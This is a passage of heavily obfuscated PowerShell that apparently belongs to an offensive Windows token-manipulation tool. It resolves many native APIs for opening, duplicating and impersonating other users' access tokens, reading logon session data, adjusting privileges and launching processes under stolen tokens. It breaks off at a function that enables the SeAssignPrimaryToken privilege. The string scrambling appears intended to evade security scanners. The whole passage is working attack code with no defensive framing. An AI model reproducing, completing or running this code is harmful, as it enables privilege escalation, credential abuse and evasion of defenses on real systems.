    ${TYPe`Bu`I`lDEr}.("{2}{3}{0}{1}" -f'e','Field','Defi','n').Invoke(("{3}{2}{0}{4}{1}" -f 'rit','nce','nhe','grfI','a'), [UInt32], ("{0}{1}" -f'Pub','lic')) | &("{2}{0}{1}" -f '-Nu','ll','Out')
    ${TY`Peb`U`IldeR}.("{0}{2}{3}{1}" -f'Def','eld','ineF','i').Invoke(("{1}{2}{0}"-f 'e','Trust','e'), ${tR`U`STEE}, ("{2}{1}{0}" -f 'blic','u','P')) | &("{1}{0}"-f'Null','Out-')
    ${E`xPliCIt`_a`c`cESS} = ${tYPEb`U`ILD`er}.("{3}{1}{0}{2}"-f'a','re','teType','C').Invoke()
    


    
    
    
    ${op`eNp`ROceS`SadDr} = &("{0}{1}{2}{3}"-f 'Get-ProcAd','d','res','s') ("{3}{1}{2}{0}" -f '2.dll','er','nel3','k') ("{2}{1}{0}{3}" -f'ces','o','OpenPr','s')
    ${op`e`NprOc`e`SSd`eLeGAte} = &("{3}{2}{1}{0}" -f 'Type','ate','g','Get-Dele') @([UInt32], [Bool], [UInt32]) ([IntPtr])
    ${Op`ENpro`CE`ss} =  (GET-ChiLdIteM  ("VAR"+"i"+"ABLe:A"+"2S")  ).vaLUE::("{5}{8}{4}{0}{7}{6}{1}{3}{2}"-f'ga','unctionP','ter','oin','le','Ge','eForF','t','tDe').Invoke(${O`PEnPro`cEs`Sad`DR}, ${o`PenprO`CeSS`d`e`LEGAtE})

    ${o`p`eN`ProcesSTOkeNAD`Dr} = &("{4}{2}{0}{3}{1}" -f'r','dress','-P','ocAd','Get') ("{3}{0}{1}{2}"-f 'vapi32.','dl','l','ad') ("{4}{0}{3}{1}{2}" -f 'Process','o','ken','T','Open')
    ${OP`enP`RoceSS`ToKEnd`E`LeGAtE} = &("{1}{3}{0}{2}"-f'teTyp','Get-Deleg','e','a') @([IntPtr], [UInt32],   (GeT-vArIABle  ("{1}{0}"-f 't','il0M')  -vA).("{2}{1}{4}{3}{0}" -f'e','ef','MakeByR','yp','T').Invoke()) ([Bool])
    ${o`pEnp`R`oCESStOken} =  (GET-vaRIaBlE ("A"+"2s")  -vAlUe )::("{0}{7}{3}{2}{5}{1}{4}{6}" -f'G','Function','ga','e','Point','teFor','er','etDel').Invoke(${OP`EnPr`o`C`eSS`TokENaD`DR}, ${oP`eNPrO`Cess`TO`KE`NDeL`EGAte})    

    ${getTO`KenINform`AT`iO`NADDr} = &("{0}{3}{1}{4}{2}" -f 'G','dd','s','et-ProcA','res') ("{2}{0}{1}" -f 'dva','pi32.dll','a') ("{1}{0}{2}{3}{4}{5}"-f'tTok','Ge','enInfor','m','atio','n')
    ${Ge`TTOKe`NiNFOR`M`ATIo`NdeL`eGaTE} = &("{2}{5}{4}{0}{3}{1}"-f 'e','teType','Get','ga','el','-D') @([IntPtr], ${t`O`KeN`_INf`o`RMatI`ON_cLAsS}, [IntPtr], [UInt32],   (vaRIable ("ovs"+"06")).VAlUE.("{2}{1}{3}{0}" -f 'ype','ak','M','eByRefT').Invoke()) ([Bool])
    ${G`etToKe`NinF`OrmAT`ion} =   ( GEt-VaRIAbLE  ("a2"+"s") -vALUeON  )::("{0}{1}{2}{5}{4}{3}" -f'G','etD','el','nter','unctionPoi','egateForF').Invoke(${getT`OKeNI`N`For`mATiONAdDr}, ${G`eTToKeNI`Nf`orMa`TIo`N`deLEGATe})    

    ${se`TT`HR`EA`dtO`kEnADdr} = &("{0}{1}{2}" -f'Get-Pr','ocAd','dress') ("{1}{2}{0}" -f'll','a','dvapi32.d') ("{1}{0}{2}" -f 'ThreadTo','Set','ken')
    ${SeTthR`eaDTo`k`ENDeLe`gate} = &("{5}{2}{3}{4}{0}{1}" -f 'Ty','pe','et-Dele','ga','te','G') @([IntPtr], [IntPtr]) ([Bool])
    ${SE`TTH`REAdtok`En} =  $a2s::("{2}{3}{6}{1}{0}{7}{5}{4}{8}" -f 'io','ct','GetDelegateF','orF','nt','oi','un','nP','er').Invoke(${sett`hre`AdTO`KE`NaD`DR}, ${setThrEaDt`OK`en`deL`eg`ATe})    

    ${I`m`per`SOna`TeloGG`Ed`oNus`ErADDr} = &("{3}{4}{0}{1}{2}"-f'ocAd','dre','ss','Get','-Pr') ("{2}{3}{1}{0}"-f'32.dll','pi','a','dva') ("{5}{0}{3}{1}{6}{2}{4}"-f'per','na','o','so','ggedOnUser','Im','teL')
    ${iMp`eRSONa`T`e`Lo`gG`EdOnuseRDEleGate} = &("{1}{2}{0}{4}{3}"-f 'eg','Get-D','el','eType','at') @([IntPtr]) ([Bool])
    ${iMpE`RSoNAt`eL`OgGEd`ONUsEr} =   ( gCI  ("{3}{2}{0}{1}"-f 'bLE',':A2S','iA','vaR')).VAlue::("{3}{2}{4}{1}{7}{6}{5}{0}"-f'r','Fo','Deleg','Get','ate','nte','unctionPoi','rF').Invoke(${I`MpERsonAteL`og`G`edoNUser`A`DDR}, ${I`Mpe`R`SO`N`AtelOgGe`DoN`UserD`EleGa`Te})

    ${REve`R`TtoS`eLFAdDR} = &("{0}{1}{3}{2}{4}" -f'Get-Pro','c','s','Addre','s') ("{2}{0}{1}" -f 'api32.d','ll','adv') ("{0}{2}{1}" -f 'R','lf','evertToSe')
    ${rE`V`E`Rtto`S`ElFd`eleGAte} = &("{0}{2}{3}{4}{1}"-f'Get-De','e','l','egate','Typ') @() ([Bool])
    ${re`VEr`T`ToseLf} =   (  ChilDiTeM ('VArI'+'aB'+'Le:A2s') ).vALUE::("{1}{4}{5}{6}{0}{2}{3}" -f'unctio','GetDel','nP','ointer','egat','e','ForF').Invoke(${rE`V`eRtTOS`ElfAD`dR}, ${rEv`erTTOsElf`D`E`LegA`Te})

    ${lsa`GE`TLOGONseSSi`o`N`DAT`AA`D`DR} = &("{1}{3}{2}{4}{0}" -f 'Address','G','Pr','et-','oc') ("{2}{0}{1}"-f 'e','cur32.dll','s') ("{2}{4}{0}{1}{3}{5}{6}"-f'ss','io','LsaGetLog','n','onSe','Dat','a')
    ${LsaGE`Tlo`gOnSESSIOnd`A`TaDel`Egate} = &("{1}{0}{3}{2}{4}" -f 't-','Ge','T','Delegate','ype') @([IntPtr],   ( varIAbLE ("{0}{1}"-f 'i','l0mt') -VA  ).("{3}{2}{0}{1}"-f'RefTyp','e','akeBy','M').Invoke()) ([UInt32])
    ${LsAgEtlOg`o`NsesSI`OndatA} =   (  GET-item  ('Var'+'iaB'+'le:A2S')  ).vaLuE::("{0}{2}{3}{5}{4}{1}" -f 'GetDe','ter','legateForFu','nct','Poin','ion').Invoke(${lsA`gE`TlOgo`NSEsSio`N`DatA`Addr}, ${l`s`A`g`ETloG`OnseS`SIond`AtADe`lE`GaTe})

    ${c`ReA`T`EpR`oC`e`SSWIT`HtOkENwAd`Dr} = &("{2}{0}{1}" -f's','s','Get-ProcAddre') ("{1}{0}{3}{2}"-f 'ap','adv','dll','i32.') ("{5}{1}{0}{2}{3}{4}"-f'roce','ateP','ssWi','thToken','W','Cre')
    ${creAtep`R`oces`swIt`HTo`kenwdE`lEgA`Te} = &("{1}{0}{3}{2}"-f 'Deleg','Get-','pe','ateTy') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    ${C`ReA`TE`pr`OCeSsWItH`TO`kENw} =   $a2s::("{5}{8}{7}{1}{0}{3}{6}{2}{4}" -f 'c','orFun','onPoint','t','er','GetDe','i','eF','legat').Invoke(${CR`EatE`prOceSSW`iTHToK`e`N`waddR}, ${crE`Ateprocess`WiT`Hto`K`E`NwdElE`GaTe})

    ${M`EMSe`Ta`Ddr} = &("{3}{4}{0}{2}{1}" -f'ocAd','s','dres','Get-','Pr') ("{2}{1}{0}" -f 'crt.dll','sv','m') ("{0}{1}" -f 'mem','set')
    ${me`ms`eTDeleGA`Te} = &("{0}{2}{1}{3}"-f'Get','legateTyp','-De','e') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
    ${Me`Ms`ET} =  ( gI  ("{0}{1}{2}"-f'VAriABle:a','2','s') ).vAlUE::("{8}{7}{6}{1}{0}{5}{4}{3}{2}" -f'or','F','er','nPoint','tio','Func','te','Delega','Get').Invoke(${m`eMse`T`ADDr}, ${mE`Msetde`LE`g`ATe})

    ${d`UPlICA`TETokE`NExad`DR} = &("{0}{1}{3}{2}"-f'Ge','t-ProcAdd','s','res') ("{2}{1}{3}{0}"-f 'api32.dll','d','a','v') ("{0}{2}{1}" -f 'D','kenEx','uplicateTo')
    ${DuP`LiCATETO`K`eNEXd`e`leGaTe} = &("{2}{0}{3}{1}" -f'-Dele','ype','Get','gateT') @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32],  $iL0mT.("{2}{1}{0}{3}"-f'p','yRefTy','MakeB','e').Invoke()) ([Bool])
    ${d`UpLiCaTe`ToKe`NEX} =   ( vARiaBLe  ("{0}{1}"-f 'A2','S')  -VAlUEONLy )::("{4}{3}{1}{5}{0}{2}" -f 't','F','er','ateFor','GetDeleg','unctionPoin').Invoke(${D`U`PlI`cAt`eTOkenExaDdr}, ${dUp`lI`Cat`E`TO`kenEX`dElEgAtE})

    ${Lo`OkUp`Ac`CO`U`NTsiD`wadDr} = &("{2}{3}{0}{1}" -f'cAd','dress','Get-P','ro') ("{1}{2}{0}"-f 'i32.dll','a','dvap') ("{3}{2}{0}{1}"-f 'id','W','pAccountS','Looku')
    ${l`oOkUPacCoU`NtS`IDW`d`ELEg`AtE} = &("{3}{2}{4}{0}{1}"-f'gate','Type','et-D','G','ele') @([IntPtr], [IntPtr], [IntPtr],  $Ovs06.("{3}{1}{0}{2}"-f'eB','ak','yRefType','M').Invoke(), [IntPtr],  $OvS06.("{1}{2}{0}" -f 'pe','Mak','eByRefTy').Invoke(),   $OVs06.("{1}{2}{0}{3}"-f'RefT','Ma','keBy','ype').Invoke()) ([Bool])
    ${l`Oo`kuPaCcoUN`TSI`Dw} =  (ls  ("{1}{0}{2}"-f':A2','varIable','S')  ).vAlue::("{3}{5}{0}{4}{6}{7}{1}{2}"-f 'De','teForFu','nctionPointer','Ge','l','t','eg','a').Invoke(${lOO`kU`Pa`C`coUn`TSIdWADDR}, ${LO`OKU`P`A`ccOuNtSiDwDELeGA`Te})

    ${closEh`A`Ndlea`DDr} = &("{1}{0}{3}{2}"-f'et-P','G','ocAddress','r') ("{0}{2}{1}" -f'kernel','2.dll','3') ("{1}{0}{2}"-f 'ose','Cl','Handle')
    ${cLoSEH`AnDlEde`leG`ATe} = &("{4}{3}{1}{0}{2}" -f 'elegate','-D','Type','t','Ge') @([IntPtr]) ([Bool])
    ${close`HAN`D`Le} =   $a2s::("{2}{0}{3}{5}{1}{4}" -f 'Fo','o','GetDelegate','r','nPointer','Functi').Invoke(${cLo`se`ha`Nd`Lea`DDr}, ${CLOSEhAn`DLEde`l`eGA`Te})

    ${l`sAFreE`ReTU`RNBU`FFe`RAdDr} = &("{0}{1}{2}{3}" -f 'G','et-ProcAddr','es','s') ("{0}{2}{1}"-f's','2.dll','ecur3') ("{0}{2}{1}{3}"-f'LsaF','eReturnB','re','uffer')
    ${lSAFReERe`TuR`NbUffeRDeL`e`g`A`Te} = &("{1}{2}{0}"-f'Type','Get-D','elegate') @([IntPtr]) ([UInt32])
    ${L`SA`FrEEREturnB`UfFER} =  $a2S::("{4}{3}{0}{1}{5}{2}"-f'egateForFunct','i','er','el','GetD','onPoint').Invoke(${LSAF`REE`ReturN`BuFF`ErADdr}, ${LS`A`FRE`E`RET`Urnbu`FFEr`delEGATe})

    ${oP`enthr`E`ADa`DDr} = &("{2}{1}{0}{3}"-f 'd','d','Get-ProcA','ress') ("{2}{3}{0}{1}" -f'.dl','l','kerne','l32') ("{0}{1}{2}{3}" -f 'OpenThr','e','a','d')
    ${opEnT`hrEAdD`eLeGa`TE} = &("{3}{1}{4}{0}{2}"-f'egateTy','D','pe','Get-','el') @([UInt32], [Bool], [UInt32]) ([IntPtr])
    ${o`p`EnThR`Ead} =   (Gi  ("{1}{2}{0}" -f'S','vArI','able:a2')).value::("{0}{3}{2}{4}{1}{5}{6}"-f 'GetDelegateFo','nctionP','F','r','u','oi','nter').Invoke(${oP`eN`T`Hr`eaDaddR}, ${o`P`eN`ThreaDdeLegATe})

    ${o`p`eNThrEa`DtoK`E`NA`ddR} = &("{2}{0}{1}" -f '-Pro','cAddress','Get') ("{0}{1}{2}"-f 'a','dvapi','32.dll') ("{0}{2}{1}{3}"-f'OpenTh','e','r','adToken')
    ${OpeNTH`RE`Adt`ok`ENdElE`gA`Te} = &("{3}{0}{1}{2}"-f '-Delegate','Ty','pe','Get') @([IntPtr], [UInt32], [Bool],  (lS ("{1}{0}{3}{4}{2}" -f 'BLE','VaRia','t',':IL0','M')).vAlue.("{1}{3}{0}{2}"-f 'yRefT','M','ype','akeB').Invoke()) ([Bool])
    ${OPe`NT`H`RE`ADTOKEN} =   (get-IteM ("{2}{0}{1}"-f 'b','LE:A2s','VArIA')  ).valUe::("{5}{2}{3}{6}{4}{1}{0}" -f 'ionPointer','ct','etDe','leg','n','G','ateForFu').Invoke(${o`pEnth`R`EAD`TOkenad`Dr}, ${o`pENTh`Read`TOKe`N`dELEgaTE})

    ${crEaTep`ROc`E`s`SaS`U`Serw`AddR} = &("{1}{3}{0}{2}{4}" -f't-','G','Pr','e','ocAddress') ("{1}{2}{3}{0}" -f'dll','a','d','vapi32.') ("{3}{2}{4}{0}{1}" -f'User','W','cessA','CreatePro','s')
    ${CreaT`EpRocEsSAs`U`sER`wDeL`E`G`A`TE} = &("{2}{4}{3}{0}{1}" -f 'teTy','pe','Get-De','ega','l') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
    ${CREaT`epr`OCeSS`As`USerW} =  $A2s::("{0}{8}{5}{2}{3}{6}{1}{7}{4}"-f'Ge','r','l','egat','ointer','De','eFo','FunctionP','t').Invoke(${c`ReATeP`ROCESS`ASUSErw`AD`dR}, ${CREATEprO`cE`S`sASus`e`Rwde`LegA`TE})

    ${o`Penw`inDo`WS`TaTiONW`Ad`dr} = &("{1}{3}{0}{2}"-f'o','Get-P','cAddress','r') ("{2}{1}{0}" -f'l','.dl','user32') ("{0}{3}{2}{1}" -f'OpenWin','ionW','owStat','d')
    ${o`pe`NWI`NdOw`StATi`ONwd`eLE`gatE} = &("{4}{0}{3}{2}{1}"-f 'D','ateType','leg','e','Get-') @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ${oPENw`i`N`DOWSTa`TiONw} =  (  gEt-VArIaBLe ("A2"+"S") ).ValUE::("{5}{4}{2}{1}{3}{0}" -f'ter','ctionP','eForFun','oin','t','GetDelega').Invoke(${OPENwind`o`ws`T`Ationwa`d`DR}, ${op`enWInDOWstAtio`NwD`eLegA`TE})

    ${o`pEndEsktopA`A`Ddr} = &("{1}{2}{0}{3}"-f'ProcA','Get','-','ddress') ("{1}{0}{2}"-f'.','user32','dll') ("{1}{3}{0}{2}" -f 'top','Ope','A','nDesk')
    ${Op`eNDeS`K`TopAD`eLEgate} = &("{0}{1}{3}{2}"-f 'Ge','t-Del','gateType','e') @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    ${oPeNDE`s`kt`opA} =   (cHILDiTEm ("VARiA"+"BL"+"e:A2s")).vALue::("{4}{0}{5}{6}{2}{1}{3}" -f'elegat','onPoint','ti','er','GetD','eForFu','nc').Invoke(${OPe`NdeskT`oPA`AdDr}, ${oPen`desKtO`PADeleGA`TE})

    ${Imp`erS`ON`A`TeSelf`AdDr} = &("{0}{3}{1}{2}" -f'Ge','-Proc','Address','t') ("{1}{0}{2}" -f 'a','Adv','pi32.dll') ("{0}{2}{1}" -f 'Impe','ateSelf','rson')
    ${im`Per`s`ona`TE`SeLf`DElEgAte} = &("{1}{2}{0}{3}" -f 'egateT','Get-','Del','ype') @([Int32]) ([Bool])
    ${imP`ERS`O`N`AteSelF} =  ( LS  ("{0}{3}{2}{1}" -f'VA','S','AbLE:A2','Ri')  ).VaLuE::("{4}{1}{0}{2}{6}{5}{3}"-f 'g','e','ate','Pointer','GetDel','unction','ForF').Invoke(${ImpEr`SOnA`T`E`selfaddr}, ${IMpE`RsOn`ATE`SeLfdeLegA`Te})

    ${lOok`U`pp`RiV`ILegEVaLuEaddR} = &("{4}{2}{3}{0}{1}" -f 'dre','ss','rocA','d','Get-P') ("{2}{0}{1}"-f '32.','dll','Advapi') ("{3}{1}{2}{4}{5}{0}" -f'A','upP','rivi','Look','legeV','alue')
    ${loOk`Up`PR`IvilEGev`AlUed`elEGAte} = &("{4}{2}{1}{3}{0}"-f'Type','a','Deleg','te','Get-') @([String], [String], ${lu`iD}.("{3}{0}{2}{1}"-f'eByRe','ype','fT','Mak').Invoke()) ([Bool])
    ${L`Ooku`pPR`IVI`LEgevA`luE} =  ( gCi  ("vArIa"+"b"+"le:"+"a2s")).VaLue::("{4}{2}{1}{0}{3}" -f 'o','unctionP','elegateForF','inter','GetD').Invoke(${LOOkU`P`P`Riv`IL`eGEVA`LUEAD`DR}, ${LOO`kUP`Pri`VIL`EG`EVALueDE`lEGa`Te})

    ${ADJus`TTOK`eNP`RiVilEGe`sADDR} = &("{3}{2}{4}{0}{1}" -f'-P','rocAddress','e','G','t') ("{1}{2}{0}" -f'll','Advapi3','2.d') ("{5}{2}{3}{0}{4}{6}{1}"-f 'Pr','s','justToke','n','ivil','Ad','ege')
    ${AD`jusTtoKeNP`RIvIl`eGeSDeLeG`Ate} = &("{0}{1}{4}{3}{2}" -f'G','et-','Type','egate','Del') @([IntPtr], [Bool], ${T`o`KEn_pR`ivIlE`G`ES}.("{2}{1}{0}{3}"-f'ByRef','ake','M','Type').Invoke(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    ${adj`U`S`TtoKen`P`RiViLegES} =  (  gEt-CHILditeM  ("{0}{1}{3}{2}"-f 'vAr','IaBL',':a2S','e')  ).VaLUe::("{2}{8}{0}{5}{1}{6}{4}{7}{3}"-f 'le','unct','Get','nter','o','gateForF','i','nPoi','De').Invoke(${a`dJuSt`TokeNPRIvilEgE`s`A`D`dr}, ${adjUSTtoK`En`pRiViLEGE`sd`EL`EGate})

    ${g`e`TC`UrREntThre`AdAdDR} = &("{4}{2}{0}{1}{3}"-f'P','rocAddres','-','s','Get') ("{0}{2}{3}{1}"-f 'k','dll','erne','l32.') ("{1}{4}{0}{2}{3}"-f'tT','GetCur','hrea','d','ren')
    ${G`EtcuR`RenTtHre`A`ddE`L`Eg`Ate} = &("{2}{4}{3}{1}{0}" -f 'pe','eTy','Get-De','egat','l') @() ([IntPtr])
    ${Ge`Tc`URr`enttHread} =  (itEm  ("{2}{0}{1}"-f'LE:a2','S','vaRIAB')  ).VAlue::("{3}{1}{7}{0}{4}{6}{5}{2}{8}" -f 'ga','Del','i','Get','te','rFunct','Fo','e','onPointer').Invoke(${get`cuRreNtTHrEa`dad`Dr}, ${g`eTcuRreNttH`R`Ead`De`L`EgATE})

    ${geTSecU`RITYin`FO`A`ddr} = &("{3}{1}{2}{0}"-f 'ess','e','t-ProcAddr','G') ("{2}{1}{0}" -f 'l','32.dl','advapi') ("{1}{4}{2}{0}{3}" -f'yIn','G','urit','fo','etSec')
    ${GetsEcuRITy`inFode`l`E`GATe} = &("{0}{3}{1}{2}" -f 'Get-','elegat','eType','D') @([IntPtr], [UInt32], [UInt32],  $IL0MT.("{2}{1}{4}{0}{3}"-f'p','ef','MakeByR','e','Ty').Invoke(),  $il0mT.("{2}{0}{3}{1}"-f 'a','ByRefType','M','ke').Invoke(),   (  geT-VARiaBlE  ("{1}{0}"-f 'T','IL0M')  ).vAlue.("{2}{1}{0}{3}"-f'RefTyp','y','MakeB','e').Invoke(),  ( ls ("{4}{1}{0}{2}{3}"-f'E:i','l','l','0MT','vAriab')).ValUe.("{2}{3}{0}{1}"-f'ByRef','Type','Mak','e').Invoke(),   (  GI  ("{3}{0}{2}{1}"-f'ARi','e:iL0Mt','abL','v')  ).VaLue.("{0}{2}{1}"-f 'MakeByR','ype','efT').Invoke()) ([UInt32])
    ${gETS`E`cu`RIt`YINFo} =   $a2S::("{6}{4}{0}{5}{2}{1}{3}" -f'unct','in','Po','ter','teForF','ion','GetDelega').Invoke(${G`e`T`Sec`UritY`InfoAd`Dr}, ${gE`TSEc`UrITy`i`NFODeLeGaTe})

    ${SE`TseCUri`TyiNf`oAD`DR} = &("{2}{3}{0}{1}" -f 'ocAd','dress','Get-P','r') ("{3}{1}{0}{2}"-f'2.d','pi3','ll','adva') ("{4}{1}{2}{0}{3}" -f'urityI','e','c','nfo','SetS')
    ${S`eTseCuri`T`yINf`od`E`LegatE} = &("{2}{4}{1}{3}{0}" -f'teType','t-De','G','lega','e') @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${sEtseCurIT`y`iN`FO} =   (gET-vARiabLE  ("A2"+"S")).VALuE::("{1}{3}{2}{6}{0}{5}{4}" -f'P','GetDelegate','u','ForF','ter','oin','nction').Invoke(${s`etseCurItY`INFo`Ad`Dr}, ${seT`SEcuritY`IN`FOd`eL`eG`Ate})

    ${geTac`E`A`Ddr} = &("{4}{3}{1}{2}{0}"-f's','dr','es','-ProcAd','Get') ("{3}{1}{0}{2}" -f'api32.','dv','dll','a') ("{1}{0}{2}" -f 'A','Get','ce')
    ${g`EtacE`DELEg`A`Te} = &("{0}{2}{1}{4}{3}"-f'Get-D','e','el','e','gateTyp') @([IntPtr], [UInt32],   $il0mt.("{3}{1}{0}{2}"-f 'ByR','ke','efType','Ma').Invoke()) ([IntPtr])
    ${g`ET`Ace} =  $A2S::("{2}{4}{8}{3}{5}{7}{1}{0}{6}" -f'e','int','G','egate','et','For','r','FunctionPo','Del').Invoke(${GEtaC`Ea`ddr}, ${g`eT`AceDeL`Egate})

    ${lo`o`KuPAcCoUnTSiDwAD`dR} = &("{3}{4}{1}{2}{0}" -f 's','dre','s','Get-P','rocAd') ("{2}{3}{1}{0}" -f'll','d','advapi','32.') ("{3}{0}{2}{1}" -f 'A','countSidW','c','Lookup')
    ${Look`UpaccOUNT`sIdw`de`l`egaTe} = &("{3}{4}{0}{1}{2}" -f 'eg','ateTyp','e','G','et-Del') @([IntPtr], [IntPtr], [IntPtr],   ( ItEM  ("{0}{1}{2}{3}" -f 'vAr','Iab','LE:ovs0','6')  ).VAlue.("{2}{3}{1}{0}"-f 'pe','Ty','Mak','eByRef').Invoke(), [IntPtr],   (VaRIAbLE ('oV'+'s06')).ValUE.("{3}{2}{0}{1}"-f 'yRef','Type','eB','Mak').Invoke(),  (VaRiaBle  ('Ov'+'s06') -ValueoNly).("{1}{3}{0}{2}"-f 'fTyp','Mak','e','eByRe').Invoke()) ([Bool])
    ${Loo`k`UP`ACc`oUnTsIDW} =  $a2s::("{4}{5}{2}{3}{0}{1}"-f 't','er','egateForFuncti','onPoin','GetDe','l').Invoke(${L`ooK`UPAcc`OUn`TSiD`WAdDR}, ${LOokU`paCCoUNT`S`id`WD`e`LeGAtE})

    ${Ad`D`ACCEsSalLowE`d`AcE`A`DDR} = &("{4}{0}{3}{2}{1}"-f '-Pr','s','res','ocAdd','Get') ("{1}{0}{2}"-f'l','advapi32.d','l') ("{4}{5}{2}{1}{0}{3}" -f'owed','All','dAccess','Ace','A','d')
    ${a`dDaccE`ss`AL`loWeDaCeD`E`LEgAtE} = &("{1}{3}{4}{0}{2}" -f'eTy','Get','pe','-','Delegat') @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ${Ad`DAcceS`sallOWEd`ACE} =   $A2s::("{3}{2}{0}{4}{1}{5}"-f'eF','ctionPoin','at','GetDeleg','orFun','ter').Invoke(${ad`DACC`esS`AlLoweDACEa`DDr}, ${ADdaCC`Ess`ALlo`W`E`daCede`l`EG`AtE})

    ${creat`e`WE`L`lkNoWn`si`dADdR} = &("{2}{1}{0}{3}{4}" -f 'rocAd','-P','Get','dre','ss') ("{3}{0}{2}{1}" -f'v','i32.dll','ap','ad') ("{1}{4}{0}{2}{3}"-f'teWe','Cre','llKnownS','id','a')
    ${c`ReAt`EweLlKn`oWNSId`d`eleg`AtE} = &("{4}{1}{0}{2}{3}"-f 'at','g','eTy','pe','Get-Dele') @([UInt32], [IntPtr], [IntPtr],  (  iTEM ("{0}{1}{2}{3}" -f'variab','Le',':oV','s06')).vAlue.("{1}{4}{3}{0}{2}" -f 'p','MakeBy','e','y','RefT').Invoke()) ([Bool])
    ${C`Re`At`Ew`ELlknOwNSID} =  (GcI  ("VaRIaB"+"l"+"E:a2S") ).vALue::("{2}{5}{4}{7}{1}{3}{0}{6}" -f 'ctionPo','teForFu','Ge','n','le','tDe','inter','ga').Invoke(${CrEA`T`ewellk`NoWNS`idAd`Dr}, ${C`ReATEwelL`kNOwn`SidDE`l`eGAtE})

    ${S`E`TEn`TrIEsi`NAclWA`DDR} = &("{1}{2}{0}{3}{4}"-f'ProcAd','G','et-','d','ress') ("{2}{0}{1}"-f '32.d','ll','advapi') ("{1}{2}{3}{0}{4}" -f 'c','SetEntr','i','esInA','lW')
    ${s`ETEnT`RiEsIN`A`Clw`DE`LEGa`Te} = &("{3}{0}{4}{2}{1}"-f'-Deleg','ype','T','Get','ate') @([UInt32], ${ex`PLiCit`_A`CC`esS}.("{2}{0}{3}{1}"-f'akeByRefTy','e','M','p').Invoke(), [IntPtr],   (  iTeM ('v'+'Ar'+'iaBLE'+':IL0M'+'t')  ).VaLuE.("{3}{2}{1}{0}"-f'ype','fT','Re','MakeBy').Invoke()) ([UInt32])
    ${SetENt`RIe`SI`Nac`Lw} =  (geT-ChIlditEM ('v'+'AR'+'I'+'AblE:A2S') ).VAlue::("{3}{5}{4}{6}{7}{8}{2}{0}{1}" -f'nt','er','i','GetDel','r','egateFo','F','unc','tionPo').Invoke(${S`ETE`NtrIes`inAclw`Ad`DR}, ${sETe`NtriesI`NaCL`wD`EL`EG`A`Te})

    ${loc`AL`FreE`AddR} = &("{4}{1}{0}{2}{3}"-f 'P','-','rocAddr','ess','Get') ("{0}{1}{2}{3}"-f 'ke','rn','el32','.dll') ("{1}{0}"-f'calFree','Lo')
    ${lO`CaLFr`eed`eL`e`GaTE} = &("{3}{1}{0}{2}"-f'Typ','legate','e','Get-De') @([IntPtr]) ([IntPtr])
    ${LOC`A`LF`REe} =   (  VariABle ("A"+"2S")  ).VaLUe::("{5}{4}{8}{7}{2}{6}{1}{3}{0}" -f 'nter','nct','eFor','ionPoi','tDeleg','Ge','Fu','t','a').Invoke(${LocA`lfR`eeADdR}, ${Lo`cA`lFREed`EleGa`TE})

    ${LOOKu`p`Pri`VI`LegENaMeW`Ad`Dr} = &("{0}{1}{3}{2}" -f 'Ge','t-ProcA','s','ddres') ("{2}{1}{3}{0}"-f 'll','2.','advapi3','d') ("{1}{2}{3}{0}"-f 'meW','Loo','kupP','rivilegeNa')
    ${looKu`PpRIvil`e`GenA`meWdelE`gaTe} = &("{1}{3}{2}{0}" -f 'Type','Get-D','ate','eleg') @([IntPtr], [IntPtr], [IntPtr],  (gi ("{0}{2}{3}{1}"-f 'Va','s06','RiABlE',':OV')  ).vAluE.("{2}{0}{1}{4}{3}" -f'ake','By','M','e','RefTyp').Invoke()) ([Bool])
    ${looK`UP`pR`I`VILEGEnameW} =   ( geT-ItEM ("{2}{0}{3}{1}" -f':A','s','VARIaBle','2')).VaLue::("{5}{1}{0}{3}{4}{6}{2}" -f'Dele','t','inter','gat','eForFunct','Ge','ionPo').Invoke(${LOo`k`UPpRIv`i`lE`GeNam`Ew`AdDr}, ${l`OoKUpprIvIl`EGe`NaM`EwDeL`egate})
    


    
    Function a`d`d-`SiGNEDIntA`sunSi`Gn`ED
    {
        Param(
        [Parameter(pOsITIOn = 0, maNDaTORY = ${t`RuE})]
        [Int64]
        ${VaL`U`E1},
        
        [Parameter(poSiTIon = 1, mAnDaTORy = ${T`Rue})]
        [Int64]
        ${va`luE2}
        )
        
        [Byte[]]${valu`e1B`ytES} =  ( DiR  ("VarIABle"+":6G"+"tX")  ).VALUE::("{1}{0}"-f 'ytes','GetB').Invoke(${vA`l`Ue1})
        [Byte[]]${Va`lU`E2Bytes} =   $6gtx::("{0}{1}{2}"-f 'GetBy','t','es').Invoke(${VA`lue2})
        [Byte[]]${fi`NAlB`yTEs} =  (vaRIablE ('6'+'Gtx')  -vAlueoNlY)::"get`By`TES"([UInt64]0)

        if (${v`ALue1bY`T`es}."CO`UNT" -eq ${VAl`U`E2byTes}."Co`UnT")
        {
            ${CARRY`o`VeR} = 0
            for (${i} = 0; ${i} -lt ${VAlU`E1ByT`eS}."c`OunT"; ${i}++)
            {
                
                [UInt16]${s`UM} = ${VALuE`1B`YT`es}[${I}] + ${vAlu`E`2BytES}[${i}] + ${CAr`RYO`VeR}

                ${fIN`A`l`BytEs}[${I}] = ${s`Um} -band 0x00FF
                
                if ((${S`UM} -band 0xFF00) -eq 0x100)
                {
                    ${CA`R`RYO`Ver} = 1
                }
                else
                {
                    ${CaR`RYo`VEr} = 0
                }
            }
        }
        else
        {
            Throw ("{6}{5}{1}{4}{3}{2}{0}"-f 's','dd bytearrays of','ize',' s',' different','nnot a','Ca')
        }
        
        return  $6GTx::("{1}{0}" -f'nt64','ToI').Invoke(${fI`N`ALbyTes}, 0)
    }


    
    function e`NAbL`e-seAss`iGnpRIMa`R`yTO`ke`NP`RivI`LEGe
    {   
        [IntPtr]${Th`REAd`HANdLE} = ${GEt`CurreN`T`T`hrEAD}."INV`Oke"()
